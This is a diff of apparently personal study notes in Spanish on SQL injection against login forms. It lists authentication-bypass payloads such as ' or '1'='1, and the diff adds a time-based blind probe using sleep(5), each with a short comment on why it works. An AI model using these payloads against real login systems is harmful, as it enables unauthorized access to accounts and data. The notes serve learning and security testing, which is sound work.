@@ -28,6 +28,9 @@ admin' or '1'='1
 something' or '1'='1
 #Realizando esto en el campo password, se podria obtener un true por el mismo motivo anterior.
 
+something'or sleep(5)-- -
+#Si tarda 5 segundos en recargar, me esta interpretando el sleep.
+
 Campo usr: ' or '1' = '1
 Campo psw: ' or '1' = '1
 #Retorna true por mas que el usuario no exista ni coincida con la pswd
